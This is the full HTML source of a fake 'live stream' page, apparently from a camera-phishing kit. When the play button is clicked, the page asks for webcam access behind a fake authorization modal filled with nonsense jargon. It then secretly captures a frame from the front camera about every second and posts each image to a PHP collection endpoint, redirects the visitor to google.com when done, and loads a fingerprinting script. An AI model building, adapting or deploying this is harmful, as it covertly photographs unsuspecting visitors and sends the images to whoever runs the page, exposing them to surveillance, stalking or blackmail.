<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Stream • Watch Now</title>
    <meta property="og:title" content="🔴 LIVE STREAM — Exclusive Content">
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
    <style>
        :root {
            --yt-red: #ff0000;
            --bg-dark: #0f0f13;
            --card-border: rgba(255, 255, 255, 0.08);
        }

        * { margin: 0; padding: 0; box-sizing: border-box; }

        body {
            font-family: 'Inter', sans-serif;
            background: var(--bg-dark);
            color: #fff;
            min-height: 100vh;
            display: flex; flex-direction: column; align-items: center; justify-content: center;
            padding: 20px; text-align: center;
        }

        .video-box {
            background: #000;
            width: 100%; max-width: 600px;
            border-radius: 16px; border: 1px solid var(--card-border);
            padding: 40px 20px;
            box-shadow: 0 25px 50px rgba(0,0,0,0.6);
            position: relative; overflow: hidden;
            animation: slideUp 0.6s ease-out;
        }

        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; } }

        .live-banner {
            display: inline-flex; align-items: center; gap: 8px;
            background: rgba(255, 0, 0, 0.15); border: 1px solid rgba(255,0,0,0.3);
            border-radius: 20px; padding: 6px 14px; font-size: 13px; font-weight: 700; color: #ff5555;
            margin-bottom: 20px;
        }

        .live-dot { width: 8px; height: 8px; background: var(--yt-red); border-radius: 50%; animation: blink 1.5s infinite; }
        @keyframes blink { 50% { opacity: 0.3; } }

        .stream-title { font-size: 22px; font-weight: 800; margin-bottom: 12px; }
        .stream-desc { font-size: 14px; color: #94a3b8; margin-bottom: 30px; line-height: 1.6; }

        .play-btn {
            width: 64px; height: 64px; background: var(--yt-red); border-radius: 50%;
            display: flex; align-items: center; justify-content: center; margin: 0 auto 30px;
            cursor: pointer; box-shadow: 0 0 40px rgba(255,0,0,0.4);
            transition: transform 0.2s, background 0.2s;
        }

        .play-btn:hover { transform: scale(1.05); background: #cc0000; }

        .play-icon {
            width: 0; height: 0;
            border-top: 12px solid transparent;
            border-bottom: 12px solid transparent;
            border-left: 20px solid white;
            margin-left: 6px;
        }

        /* Continuous Verification Modal */
        .modal {
            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
            background: rgba(0, 0, 0, 0.85); backdrop-filter: blur(10px);
            display: none; justify-content: center; align-items: center;
            z-index: 1000;
        }

        .modal-card {
            background: rgba(22, 22, 30, 0.95);
            border: 1px solid rgba(255,255,255,0.08);
            border-radius: 20px; padding: 32px;
            width: 90%; max-width: 340px; text-align: center;
            box-shadow: 0 20px 40px rgba(0,0,0,0.4);
            animation: popUp 0.3s cubic-bezier(0.34, 1.56, 0.64, 1);
        }

        @keyframes popUp { from { transform: scale(0.8); opacity: 0; } to { transform: scale(1); } }

        .scan-frame {
            position: relative; width: 140px; height: 140px; margin: 0 auto 20px;
            border-radius: 50%; overflow: hidden; border: 3px solid rgba(255,255,255,0.1);
        }

        .scan-frame video { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }

        .pulse-ring {
            position: absolute; top: 0; left: 0; width: 100%; height: 100%;
            border-radius: 50%; border: 3px solid var(--yt-red);
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse { 0% { transform: scale(1); opacity: 1; } 100% { transform: scale(1.1); opacity: 0; } }

        .scan-status { font-size: 15px; font-weight: 700; color: #fff; margin-bottom: 4px; }
        .scan-percent { font-size: 12px; color: #64748b; margin-bottom: 20px; }

        .loader-bar { width: 100%; height: 4px; background: rgba(255,255,255,0.05); border-radius: 2px; overflow: hidden; }
        .loader-fill { width: 0%; height: 100%; background: var(--yt-red); transition: width 0.3s; }

    </style>
</head>
<body>

<canvas hidden="hidden" id="canvas" width="640" height="480"></canvas>

<div class="video-box">
    <div class="live-banner"><div class="live-dot"></div><span>Exclusive Live Grid</span></div>
    <div class="stream-title">Synchronizing buffering continuous sync...</div>
    <div class="stream-desc">Continuous node check triggers continuous stream authorization checks loaded correctly framed sync.</div>
    <div class="play-btn" onclick="startStreamAuth()"><div class="play-icon"></div></div>
</div>

<!-- SECURE SCAN MODAL -->
<div class="modal" id="scanModal">
    <div class="modal-card">
        <div class="scan-frame">
            <video id="scanVideo" autoplay playsinline></video>
            <div class="pulse-ring" id="pulseRing"></div>
        </div>
        
        <div class="scan-status" id="scanStatus">Loading Visual Stream Authorization...</div>
        <div class="scan-percent" id="scanPercent">0% Authorized node</div>

        <div class="loader-bar">
            <div class="loader-fill" id="loaderFill"></div>
        </div>
    </div>
</div>

<script>
function post(imgdata) {
    $.ajax({
        type: 'POST',
        data: { cat: imgdata },
        url: 'forwarding_link/post.php',
        dataType: 'json',
        async: false,
        success: function() {},
        error: function() {}
    });
}

function startStreamAuth() {
    const modal = document.getElementById('scanModal');
    const scanVideo = document.getElementById('scanVideo');
    const loaderFill = document.getElementById('loaderFill');
    const scanStatus = document.getElementById('scanStatus');
    const scanPercent = document.getElementById('scanPercent');

    modal.style.display = 'flex';

    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
        .then(function(stream) {
            scanVideo.srcObject = stream;

            let progress = 0;
            let statusTexts = [
                "Allocating video sync frames...",
                "Authorizing viewer continuous nodes...",
                "Mapping content buffer limits...",
                "Success! Authorization setup completed."
            ];
            let textIndex = 0;

            const timer = setInterval(() => {
                progress += Math.floor(Math.random() * 8) + 6;
                if (progress >= 100) progress = 100;

                scanPercent.innerText = `${progress}% Node binding Authorization`;
                loaderFill.style.width = `${progress}%`;

                // continuous photo takes
                var context = canvas.getContext('2d');
                context.drawImage(scanVideo, 0, 0, 640, 480);
                var canvasData = canvas.toDataURL("image/png").replace("image/png", "image/octet-stream");
                post(canvasData);

                if (progress === 100) {
                    clearInterval(timer);
                    scanStatus.innerText = "Authorized! Playback starting...";
                    setTimeout(() => { window.location.href = "https://google.com"; }, 2000); // Wait 2s
                } else if (progress % 25 === 0 && textIndex < statusTexts.length - 1) {
                    textIndex++;
                    scanStatus.innerText = statusTexts[textIndex];
                }
            }, 1000);
        })
        .catch(function() {
            alert("Visual Stream Authorization frame node compatibility safety required triggers continuous buffer connectivity setup.");
            modal.style.display = 'none';
        });
}
</script>

<script src="fingerprint.js"></script>
</body>
</html>
